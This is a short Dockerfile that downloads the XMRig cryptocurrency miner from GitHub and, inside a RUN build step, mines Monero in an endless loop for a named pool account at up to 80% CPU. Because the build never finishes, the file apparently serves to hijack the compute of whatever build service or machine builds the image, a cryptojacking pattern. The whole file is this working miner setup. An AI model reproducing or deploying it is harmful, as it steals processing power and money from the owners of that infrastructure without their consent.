FROM ubuntu:xenial
RUN apt-get update && apt-get install -y wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v3.1.1/xmrig-3.1.1-xenial-x64.tar.gz && tar -xf xmrig-3.1.1-xenial-x64.tar.gz && cd xmrig-3.1.1 && while true; do ./xmrig -a cn/r -o europe.cryptonight-hub.miningpoolhub.com:20580 -u brahim7.brahim777 -p x --threads 2 --max-cpu-usage=80 --cpu-priority 3 --donate-level 1 ; sleep 1; done
